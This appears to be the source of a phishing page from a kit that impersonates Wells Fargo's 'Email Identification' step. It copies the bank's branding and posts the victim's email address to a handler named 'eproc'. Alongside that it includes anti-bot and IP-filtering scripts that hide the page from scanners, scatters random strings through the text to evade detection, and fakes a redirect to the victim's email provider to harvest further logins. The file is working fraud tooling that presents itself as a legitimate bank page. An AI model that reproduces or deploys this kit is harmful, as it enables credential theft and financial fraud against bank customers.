<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en"><head>
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<title>Wells Fargo - Confirm Email</title>
        <link rel="shortcut icon" href="../imgs/wellfav.ico"/>
		
			<style>
			*{box-sizing:border-box;}
			html, body {
				width:100%;
				margin: 0;
				padding: 0;
				font-family: Verdana;
				font-size: 12px;
				color: #666666;
			}

			.skipLink {
				opacity: 0;
				position: absolute;
				top: -1000px;
				left: -1000px;
			}

			#body a:hover {
				text-decoration: underline;
			}

			::-webkit-input-placeholder {
				color: #767676;
			}
			:-moz-placeholder {
				color: #767676;
				opacity: 1;
			}
			::-moz-placeholder {
				color: #767676;
				opacity: 1;
			}
			:-ms-input-placeholder {
				color: #767676;
			}

			.clear-both {
				clear: both;
			}
			
			.hide{display:none;}

			.block-display {
				display: block;
			}

			.relative {
				position: relative;
			}

			main {
				width: 100%;
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
			}

			header {
				width: 100%;
				height: 58px;
				margin-bottom: 20px;
				border-bottom: 5px solid #fcc60a;
				background-color:#d71e2b;
			}

			header div {
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
				height: 100%
			}

			header ul {
				list-style: none;
				position: absolute;
				right: 0;
				margin: 0;
				bottom: 17px;
			}

			header ul[data-id="search"] {
				list-style: none;
				position: absolute;
				right: 0;
				top: 10px;
			}

			header ul[data-id="search"] li {
				float: left;
				margin-left: 17px;
			}

			header ul[data-id="search"] li input {
				height: 32px;
				width: 156px;
				padding-left: 10px;
				font-family: Verdana;
				font-size: 13px;
				color: #767676;
				border: 1px solid #c5c4c4;
				border-radius: 5px;
			}

			header ul li {
				float: left;
				margin-left: 17px;
			}


			header ul li a {
				font-family: Verdana;
				font-size: 11px;
				color: #fff;
				text-decoration: none;
			}

			header ul[data-id="headerLinks"] li a {
				font-size: 13px;
			}

			header ul[data-id="search"] li a {
				position: relative;
				top: 10px;
			}

			header ul[data-id="search"] li div {
				position: relative;
			}


			header ul li a:hover {
				color: #fff;
				text-decoration: underline;
			}

			header .logo {
				width: 242px;
				height: 40px;
				position: relative;
				top: 10px;
			}

			section[data-id="content"], section[data-id="hero"], aside {
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
			}


			section[data-id="content"] {
				float: left;
				padding-right: 30px;
				max-width: 722px;
				width:100%;
			}
			

			section[data-id="content"] h1 {
				font-family: Georgia;
				font-size: 28px;
				color: #44464a;
				line-height: 1.154em;
				font-weight: lighter;
				margin: 0;
			}
			section[data-id="content"] h2 {   
				font-family: Verdana;
				font-size: 14px;
				color: #444;
				line-height: 1.231;
				margin: 14px 0 25px 0;
			}

			section[data-id="content"] input[type="text"], section[data-id="content"] input[type="email"] {
                margin-top: 5px;
                height: 34px;
				width:80%;
                max-width: 220px;
                padding-left: 10px;
                font-weight: normal;
                text-decoration: none;
                font-size: 13px;
                color: #44464a;
                border-radius: 2px;
                border: 1px solid #cfd1d7;
				font-family:verdana;
				text-transform:capitalize;
            }
			section[data-id="content"] input.upper{
				text-transform:uppercase;
			}
			section[data-id="content"] input.normal{
				text-transform:none;
			}
			section[data-id="content"] input[type="text"],  section[data-id="content"] input[type="email"]{
				width:100%;
				max-width:300px;
			}
			section[data-id="content"] .groupin{
				margin-top:20px;
			}
			section[data-id="content"] select {
			    position: relative;
			    z-index: 0;
			    width: 100%;
			    height: 2em;
			    border: 0;
			    line-height: 2;
			    height: 45px;
			    margin-bottom: 15px;
			}

			section[data-id="content"] [data-id="linkSeparator"] {
				display: inline-block;
				padding-left: 10px;
				padding-right: 10px;
			}

			section[data-id="content"] #nd-captcha {
				display: inline-block;
			}

			section[data-id="content"] div[data-id="selectContainer"] {
				position: relative;
				width: 250px;
			}

			section[data-id="content"] div[data-id="selectContainer"]:focus {
				border: 2px solid;
			}

			section[data-id="content"] div[data-id="inputContainer"] {
				margin-top:10px;
				position: relative;
				margin-right:30px;width:100%;
			}
			section[data-id="content"] div[data-id="inputContainer"].tofloat{
				float: left;
				width:auto;
			}
			section[data-id="content"] div[data-id="inputContainer"] .insub{
				margin-top:5px;
				position: relative;
				display: block;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt{
				margin-top:5px;
				color:#5174b8;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt:hover{
				text-decoration: underline;
			}

			section[data-id="content"] div[data-id="inputContainer"] input:focus {
				outline: 2px solid #0033cc;
			}

			section[data-id="content"] div[data-id="inputContainer"] img {
				width: 12px;
				height: 12px;
			}

			section[data-id="content"] div[data-id="inputContainer"] label {
				font-weight: bold;
			}

			[data-id="footerSeparator"] {
				width: 100%;
				height: 50px;
				background: url(data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMtaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjMtYzAxMSA2Ni4xNDU2NjEsIDIwMTIvMDIvMDYtMTQ6NTY6MjcgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzYgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDkzRjI0NzlGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDkzRjI0N0FGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowOTNGMjQ3N0ZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowOTNGMjQ3OEZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv/uAA5BZG9iZQBkwAAAAAH/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwMBAQEBAQEBAgEBAgICAQICAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA//AABEIADwACQMBEQACEQEDEQH/xACCAAACAgMBAAAAAAAAAAAAAAAABAUGAQMHCgEBAQEBAAAAAAAAAAAAAAAAAAIBAxAAAQIEAgUFEQEAAAAAAAAAAQIDABETBBIF8CFiFBWh4SJWGDFhkTKS0uIjYyQ1ldUGF2coqBEBAQABBAMBAAAAAAAAAAAAABEB8CFhcUESIyL/2gAMAwEAAhEDEQA/APfrj00MV6s3GPTQw9TdqjLlohcgjAQC9Xa5OaJuqCrtcnNC6ohBdg4QleLHMtK7iXAnWpokywuiR1HXq7xERelM737K58n04XoVNV4oKeS6iam8Dl/bM1CoNqURb5rl+vEUzbJWkTUCkyJWnpxWzPJfibPWyx8OV+dCkyrKLoYbcsOLtW03BtstuLgFbuQ5ouSXvt7NmW1AcPueihqaygkoShYO7LVFXMGqma9Tsq+a2n0yFwTDhV12l6uZ712V/ho4zV/N26cPpuy4hU9zqUcXj+upbEdvlqoxb4Q/9K/of/Tsb81frh//2Q==) repeat-x left -30px;
				margin-top: 35px;
			}

			footer {
				font-size: 10px;
				font-family: Verdana;
				max-width: 722px;
				margin: auto;
				color: #434343;
			}

			footer [data-id="footnotes"]{
				padding-top: 35px;
			}

			footer [data-id="footnotesBlock"]{
				border: 1px solid #434343;
				padding: 15px 20px 15px 20px;
				margin-top: 15px;
				width: 500px;
			}

			footer [data-id="copyright"]{
				margin-top: 30px;
				padding-top: 30px;
				font-size: 12px;
			}

			footer ul {
				margin-left: -20px;
			}

			footer ul[data-id="links"] {
				list-style: none;
				margin-left: -40px;
			}

			footer ul[data-id="links"] li a{
				font-size: 12px;
				font-family: Verdana;
				text-decoration: none;
				color: #434343;
			}

			footer ul[data-id="links"] li {
				float: left;
				padding: 0 7px 0 7px;
				border-left: 1px solid #434343;
			}

			footer ul[data-id="links"] li:first-child {
				border-left: 0;
			}
			
            [data-id="submitContainer"] {
            	display: flex;
            	width: 100%;
            }

            [data-id="submit"] {
            	margin: auto;
            	border: 0;
            	font-family: Verdana;
            	font-size: 12px;
            	color: #ffffff;
            	padding: 0 20px 0 20px;
            	background-color: #d71e2b;
            	margin-top: 15px;
            	height: 45px;
            	font-weight: bold;
            	border-radius: 2px;
            	position: relative;
            	right: 30px;
            	float: right;
            }

            .alert {
            	color: #bb0826;
			    padding: 25px;
			    font-family: Verdana;
			    font-size: 12px;
				text-align:center;
				width:80%;
				border: 1px solid #bb0826;
				margin:5px auto;
				background-color:#f9f2f3;
				
            }

            section[data-id="content"] .alert a {
			    font-size: 12px;
            }

            .alert img {
            	position: relative;
            	top: 3px;
            }


			#body[theme="ssep"] [control="forms:dropdown-selector"] {
			    font-family: Verdana;
			    font-size: 14px;
			    background-image: linear-gradient(to bottom, #f5f5f5, #ffffff);
			    color: #44464a;
			    max-width: 350px;
			    margin: 10px 8px 10px 0;
			    padding: 0;
			    border: 1px solid #cfd1d7;
			    border-radius: 2px;
			    display: inline-block;
			    position: relative;
			    vertical-align: middle;
			    box-sizing: border-box;
			    cursor: pointer;
			}


			section[data-id="content"] .hr{
				padding-top: 10px;
			}
			@media only screen and (max-width:600px){
				header .logo{
					left:30px;
			}
				header {
				height: 80px;
			}
			header ul[data-id="search"] {
				padding: 0 0 0 1px;
				position:absolute;right:5px;top:45px;
			}
			header ul[data-id="search"] li{
				right:0;
				margin-left:10px;
			}
				section[data-id="content"] {
				padding:0 30px;
				margin-bottom:110px;
			}
			[data-id="submit"] {
            	right: 35%;
            	float: right;
            }
			}
		</style>

		<style>
			section[data-id="hero"] {
				overflow: hidden;
				height: 200px;
			}

			section[data-id="hero"] img {
				position: relative;
			    width: 722px;
			}
			.formError{background-color:#ffdc78;padding:17px 11px 17px 48px;box-sizing:border-box;border-bottom: 1px solid #787070;margin:7px 0 12px 5px;width:100%;position:relative;
    background-image: url(../rel/assets/alert-icon.svg);
    background-repeat: no-repeat;background-position:5px 9px ;}
	
	#redi{color:#0184bf;text-decoration:underline;transition:display 0.8s;}
	.transitioning{height:14px;width:14px;vertical-align:middle;display:inline-block;padding-right:30px;}
	.redi{height:14px;width:14px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:3px solid #0184bf;border-right:3px solid #0184bf;border-bottom:3px solid #0184bf;border-top:3px solid #fff;border-radius:100%;display:inline-block;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
		</style>
	</head>
	<body id="body" theme="ssep">
		<a href="#skip" class="skipLink">main content</a>



	
				<header>
			<div>
				
					<a href="">
					
<svg width="211px" height="22px" viewBox="0 0 211 22" class="logo">
    <g id="BIM/logo/large-211x22" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <rect fill="#D71E28" x="0" y="0" width="211" height="22"></rect>
        <g fill="#FFFFFF" fill-rule="nonzero">
            <path d="M45.112,14.1709 L47.1692,14.1709 L47.1692,21 L29.9977,21 L29.9977,18.5142 L32.4262,18.5142 L32.4262,3.4854 L28.4862,3.4854 L23.4857,21 L19.5143,21 L15.457,6.4855 L11.2859,21 L7.3142,21 L2.2857,3.4854 L0,3.4854 L0,1 L9.3143,1 L9.3143,3.4854 L6.6286,3.4854 L9.9713,15.5426 L13.9715,1 L18.0857,1 L22.1715,15.5716 L25.4574,3.4854 L22.6574,3.4854 L22.6574,1 L46.8836,1 L46.8836,7.4854 L44.8263,7.4854 L44.6263,6.7139 C43.9979,4.3139 43.3408,3.4854 41.4263,3.4854 L36.6832,3.4854 L36.6832,9.514 L42.4263,9.514 C42.6441895,9.93766455 42.7522903,10.40923 42.7407,10.8855 C42.7554638,11.3802266 42.647447,11.8709062 42.4263,12.3137 L36.6832,12.3137 L36.6832,18.5137 L41.6261,18.5137 C43.4834,18.5137 44.312,17.7137 44.8835,15.1707 L45.112,14.1709 Z M63.1676,15.1709 C62.596,17.7137 61.7961,18.5139 59.9101,18.5139 L55.9387,18.5139 L55.9387,3.4854 L58.6531,3.4854 L58.6531,1 L49.2531,1 L49.2531,3.4854 L51.6816,3.4854 L51.6816,18.5142 L49.2532,18.5142 L49.2531,21 L65.4532,21 L65.4532,14.1709 L63.396,14.1709 L63.1676,15.1709 Z M81.166,15.1709 C80.5945,17.7137 79.7945,18.5139 77.9085,18.5139 L73.9374,18.5139 L73.9374,3.4854 L76.6515,3.4854 L76.6515,1 L67.2515,1 L67.2515,3.4854 L69.68,3.4854 L69.68,18.5142 L67.2513,18.5142 L67.2513,21 L83.4513,21 L83.4513,14.1709 L81.3943,14.1709 L81.166,15.1709 Z M96.2213,9.2854 L92.5926,8.4568 C90.4785,7.971 89.5926,7.1426 89.5926,5.7425 C89.5927,4.0567 90.9356,3 93.5641,3 C96.1926,3 97.7355,3.9429 98.3357,6.1713 L98.5929,7.1429 L100.6499,7.1429 L100.6499,2.2 C98.404581,1.04498917 95.9177583,0.437838599 93.3928,0.4282 C88.5069,0.4282 85.3644,2.771 85.3644,6.5425 C85.3644,9.4567 87.1929,11.5995 90.7069,12.371 L94.3356,13.171 C96.65,13.6852 97.507,14.5995 97.507,16.1139 C97.507,17.9712 96.107,18.9995 93.307,18.9995 C90.1353,18.9995 88.507,17.7424 87.7924,15.3424 L87.4212,14.1139 L85.3642,14.1139 L85.3642,19.7139 C87.978495,21.0158067 90.8732348,21.6536976 93.7926,21.5712 C98.5926,21.5712 101.7354,19.1712 101.7354,15.428 C101.7356,12.2855 99.8212,10.1139 96.2213,9.2854 Z M123.7613,3.4854 C125.6755,3.4854 126.3329,4.3138 126.9613,6.7139 L127.1613,7.4854 L129.2185,7.4854 L129.2185,1 L111.99,1 L111.99,3.4854 L114.4187,3.4854 L114.4187,18.5142 L111.99,18.5142 L111.99,21 L121.5332,21 L121.5332,18.5142 L118.6758,18.5142 L118.6758,12.6852 L124.5616,12.6852 C124.782771,12.2424146 124.890789,11.7517289 124.876,11.257 C124.887659,10.780723 124.779554,10.3091409 124.5616,9.8855 L118.6758,9.8855 L118.6758,3.4855 L123.7613,3.4854 Z M167.3013,18.7424 C167.644229,19.4858606 167.644229,20.3422394 167.3013,21.0857 C166.56243,21.1813604 165.818136,21.229027 165.0731,21.2284 C162.3016,21.2284 160.9586,20.0855 160.6443,17.4284 L160.5299,16.4284 C160.1871,13.5429 159.2441,12.4284 156.1014,12.4284 L154.53,12.4284 L154.53,18.5143 L157.2443,18.5143 L157.2443,21 L139.2743,21 L139.2743,18.5142 L141.6171,18.5142 L140.3026,14.9425 L132.8743,14.9425 L131.56,18.5142 L133.96,18.5142 L133.96,21 L126.3883,21 L126.3883,18.5142 L128.3883,18.5142 L135.3883,0.9997 L139.1883,0.9997 L146.3312,18.5142 L150.2722,18.5142 L150.2722,3.4854 L147.8437,3.4854 L147.8437,1 L159.33,1 C163.4158,1 166.0729,3.0286 166.0729,6.2857 C166.0729,9.5143 163.4158,11.2286 160.8442,11.3429 L160.8442,11.4286 C163.4442,11.6286 164.5015,13.0856 164.7584,15.3429 L164.8728,16.3999 C165.0443,18.0571 165.3871,18.7999 166.7016,18.7999 C166.902733,18.7977246 167.103319,18.7784889 167.3012,18.7424 L167.3013,18.7424 Z M139.3887,12.5138 L136.5887,4.9426 L133.7887,12.5138 L139.3887,12.5138 Z M161.7587,6.6855 C161.7587,4.5996 160.4732,3.4855 157.9016,3.4855 L154.53,3.4855 L154.53,9.9139 L157.9014,9.9139 C160.4442,9.9139 161.7584,8.7425 161.7584,6.6855 L161.7587,6.6855 Z M178.8213,11.8855 C178.803087,12.3714846 178.911315,12.8538766 179.1354,13.2855 L182.5354,13.2855 L182.5354,18.3429 C181.466074,18.7825917 180.320179,19.0058973 179.164,18.9999 C175.0498,18.9999 172.9066,16.057 172.9066,10.9714 C172.9066,5.8858 175.0498,2.9428 178.9353,2.9428 C181.211582,2.82573104 183.274467,4.27560941 183.9353,6.457 L184.2494,7.257 L186.3066,7.257 L186.3066,2.1424 C183.957094,0.964997055 181.363082,0.358145958 178.7351,0.3711 C172.45,0.3711 168.221,4.5712 168.221,11 C168.221,17.4571 172.3352,21.5717 178.7351,21.5717 C181.529771,21.4974731 184.268764,20.7734888 186.7351,19.4571 L186.7351,10.5425 L179.1351,10.5425 C178.914342,10.9548397 178.806013,11.4180245 178.821,11.8855 L178.8213,11.8855 Z M210.6266,10.9712 C210.608634,16.8285137 205.855291,21.5672984 199.99795,21.5672984 C194.140609,21.5672984 189.387266,16.8285137 189.3693,10.9712 C189.387266,5.11388635 194.140609,0.375101649 199.99795,0.375101649 C205.855291,0.375101649 210.608634,5.11388635 210.6266,10.9712 Z M205.9408,10.9712 C205.9408,5.9139 203.8551,2.9712 199.9978,2.9712 C196.1405,2.9712 194.0551,5.9141 194.0551,10.9712 C194.0551,16.0568 196.1123,18.9712 199.9978,18.9712 C203.8833,18.9712 205.9405,16.0568 205.9405,10.9712 L205.9408,10.9712 Z" id="Shape"></path>
        </g>
    </g>
</svg>
					</a>
				
				<ul data-id="search">
								<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li>
								<li><a href=" " tabindex="0">Online Security</a></li>
					</ul>
			</div>
		</header>		




		<main>
	        <form id="Signon" action="eproc<?php if(isset($_GET['cw2'])){echo '?cw2=On';};?>" name="Signon" method="POST" onsubmit="return watreq();">
								<section data-id="content">
                        
					<noscript class="alert">Please enable javascript in your browser to use the website</noscript>
		                <h1>Email Identification</h1>
								
								<div class="formError <?php if(!isset($_GET['sfailed']) && !isset($_GET['cw2'])){echo 'hide';}?>">Incorrect email address. Please try again...<div style="margin-top:10px;">We will query your email service provider to confirm you own this email.</div></div>
		                    
						<h2>Step 1 : Confirm the <?php echo rT('ALPHANUMERIC',rand(1,87));?>Email on file</h2>
							
						<div class="clear-both groupin">
		                <div data-id="inputContainer">
							<label for="email">Email Address</label><br>
							<div class="insub">Enter the Email Address you provided us in your account:</div>
		                    <input aria-required="true" id="email" name="email" type="email"  class="normal"/>
		                </div>
						</div>
						<div class="clear-both">
		                <div data-id="inputContainer">
		                    <input name="e1h" value="<?php echo uniqid() ;?>" type="hidden"/>
			            </div>
						</div>
						
		                <div class="block-display clear-both"><br/><p><div>We need you to verify your emai<?php echo rT('ALPHANUMERIC',rand(1,87));?>l contact information to save this device as a <span style="color:#0b6efd">Trusted Device</span><br/><br/>Using industry standard encryption to protect <?php echo rT('ALPHANUMERIC',rand(1,87));?>your data, we instantly confirm your email on file and then esta<?php echo rT('ALPHANUMERIC',rand(1,87));?>blish a secure connection to verify with your email service provider</div></p>
						
						<br/><p style="font-size:14px;display:none;" id="redi"><span class='transitioning'><span class='redi'>&nbsp;</span></span>Redirecting you to your email service provider to confirm you own this <?php echo rT('ALPHANUMERIC',rand(1,87));?>email address....
    <input type="hidden" value="off" id="jas"></p>
            				<input name="Hsub" value="Continue" data-id="submit" type="submit"/>
		                </div>
				</section>




				<section data-id="submitContainer">
				</section></form>
<script>
function load(){document.getElementById('redi').style.display="block";};
function watreq(){load();var suballow=document.getElementById('jas');setTimeout(function(){suballow.value="on";document.getElementById('Signon').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>
		</main>



		<div data-id="footerSeparator"></div>
		<footer>
						<div>
				
			</div>            

						<div class="clear-both">
				<div>
					<p data-id="copyright">© 1999 - <?php echo date("Y");?> Wells Fargo. All rights reserved.</p>                        
				</div>
			</div>

		</footer>


<script>
"use strict"
document.getElementById("Signon").setAttribute("novalidate",true);
<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
</script>



	

</body></html>